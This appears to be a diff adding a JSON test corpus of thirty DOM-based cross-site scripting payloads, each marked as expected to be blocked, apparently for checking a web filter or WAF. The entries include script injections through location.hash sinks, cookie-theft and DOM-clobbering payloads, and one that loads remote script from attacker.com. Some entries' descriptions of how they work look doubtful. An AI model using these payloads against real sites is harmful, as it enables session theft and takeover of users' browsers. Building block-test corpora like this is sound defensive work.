@@ -1,0 +1,389 @@
+[
+  {
+      "id": "XSS-DOM-020",
+      "payload": "<script>document.location='javascript:alert(1)'</script>",
+      "tags": [
+        "dom",
+        "document.location",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via document.location assignment",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-021",
+      "payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>",
+      "tags": [
+        "dom",
+        "document.write",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via document.write",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-022",
+      "payload": "<script>eval(location.hash.slice(1))</script>",
+      "tags": [
+        "dom",
+        "eval",
+        "location.hash"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via eval with location.hash",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-023",
+      "payload": "<script>setTimeout(location.hash.slice(1), 100)</script>",
+      "tags": [
+        "dom",
+        "setTimeout",
+        "location.hash"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via setTimeout with location.hash",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-024",
+      "payload": "<script>setInterval(location.hash.slice(1), 1000)</script>",
+      "tags": [
+        "dom",
+        "setInterval",
+        "location.hash"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via setInterval with location.hash",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-025",
+      "payload": "<script>document.body.innerHTML = location.hash.slice(1)</script>",
+      "tags": [
+        "dom",
+        "innerHTML",
+        "location.hash",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via innerHTML with location.hash",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-026",
+      "payload": "<script>document.getElementById('x').outerHTML = location.search.slice(1)</script>",
+      "tags": [
+        "dom",
+        "outerHTML",
+        "location.search"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via outerHTML with location.search",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-027",
+      "payload": "<script>window.name='<img src=x onerror=alert(1)>'; document.write(window.name)</script>",
+      "tags": [
+        "dom",
+        "window.name",
+        "persistent"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM XSS via window.name persistence",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-028",
+      "payload": "<script>document.domain='attacker.com'</script>",
+      "tags": [
+        "dom",
+        "document.domain",
+        "sop-bypass"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via document.domain SOP bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-029",
+      "payload": "<script>new Function(location.hash.slice(1))()</script>",
+      "tags": [
+        "dom",
+        "Function",
+        "location.hash"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via Function constructor",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-030",
+      "payload": "<script>document.createElement('img').onerror = alert; document.images[0].src = 'x'</script>",
+      "tags": [
+        "dom",
+        "createElement",
+        "dynamic"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM XSS via createElement dynamic injection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-031",
+      "payload": "<script>location = 'javascript:alert(document.cookie)'</script>",
+      "tags": [
+        "dom",
+        "location",
+        "cookie-theft"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS location assignment with cookie theft",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-032",
+      "payload": "<script>window.open('javascript:alert(1)', '_self')</script>",
+      "tags": [
+        "dom",
+        "window.open"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM XSS via window.open javascript protocol",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-033",
+      "payload": "<script>document.querySelector('#target').insertAdjacentHTML('beforeend', location.hash.slice(1))</script>",
+      "tags": [
+        "dom",
+        "insertAdjacentHTML",
+        "location.hash"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via insertAdjacentHTML",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-034",
+      "payload": "<script>$('body').html(location.hash.slice(1))</script>",
+      "tags": [
+        "dom",
+        "jquery",
+        "html()"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via jQuery .html() method",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-035",
+      "payload": "<script>$('body').append(location.hash.slice(1))</script>",
+      "tags": [
+        "dom",
+        "jquery",
+        "append()"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via jQuery .append() method",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-036",
+      "payload": "<script>angular.element(document.body).scope().$eval(location.hash.slice(1))</script>",
+      "tags": [
+        "dom",
+        "angular",
+        "$eval"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via AngularJS $eval",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-037",
+      "payload": "<script>Vue.compile(location.hash.slice(1))</script>",
+      "tags": [
+        "dom",
+        "vue",
+        "compile"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via Vue.js template compilation",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-038",
+      "payload": "<script>React.createElement('script', {src: location.hash.slice(1)})</script>",
+      "tags": [
+        "dom",
+        "react",
+        "createElement"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM XSS via React.createElement",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-039",
+      "payload": "<script>window.postMessage(location.hash.slice(1), '*'); window.addEventListener('message', e => eval(e.data))</script>",
+      "tags": [
+        "dom",
+        "postMessage",
+        "message-listener"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via postMessage without origin check",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-040",
+      "payload": "<script>document.cookie = location.hash.slice(1) + '; document.location=location.hash.slice(1)'</script>",
+      "tags": [
+        "dom",
+        "cookie",
+        "redirect"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM XSS cookie manipulation with redirect",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-041",
+      "payload": "<form id=x><input id=attributes><input id=attributes></form><script>x.attributes[0].value='<img src=x onerror=alert(1)>'</script>",
+      "tags": [
+        "dom",
+        "clobbering",
+        "attributes"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM clobbering via attributes collection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-042",
+      "payload": "<form id=x><input name=action><input name=action></form><script>x.action='javascript:alert(1)'</script>",
+      "tags": [
+        "dom",
+        "clobbering",
+        "form-action"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM clobbering via form.action",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-043",
+      "payload": "<a id=x href='javascript:alert(1)'></a><script>document.getElementById('x').click()</script>",
+      "tags": [
+        "dom",
+        "click-hijack"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM XSS via programmatic click on javascript: href",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-044",
+      "payload": "<script>Object.prototype.toString = function() { alert(1); return ''; }</script>",
+      "tags": [
+        "dom",
+        "prototype-pollution",
+        "toString"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via prototype pollution on toString",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-045",
+      "payload": "<script>document.scripts[0].src = 'https://attacker.com/evil.js'</script>",
+      "tags": [
+        "dom",
+        "script-src-modification"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via script src modification",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-046",
+      "payload": "<script>document.documentElement.innerHTML = location.hash.slice(1)</script>",
+      "tags": [
+        "dom",
+        "documentElement",
+        "innerHTML"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via documentElement.innerHTML",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-047",
+      "payload": "<script>history.pushState({}, '', location.hash.slice(1)); eval(location.pathname)</script>",
+      "tags": [
+        "dom",
+        "history-api",
+        "pushState"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via History API manipulation",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-048",
+      "payload": "<script>document.implementation.createHTMLDocument().write(location.hash.slice(1))</script>",
+      "tags": [
+        "dom",
+        "createHTMLDocument"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DOM XSS via createHTMLDocument",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-DOM-049",
+      "payload": "<script>window.localStorage.setItem('xss', location.hash.slice(1)); eval(window.localStorage.getItem('xss'))</script>",
+      "tags": [
+        "dom",
+        "localStorage",
+        "persistent"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DOM XSS via localStorage persistence",
+      "category": "XSS"
+  }
+]
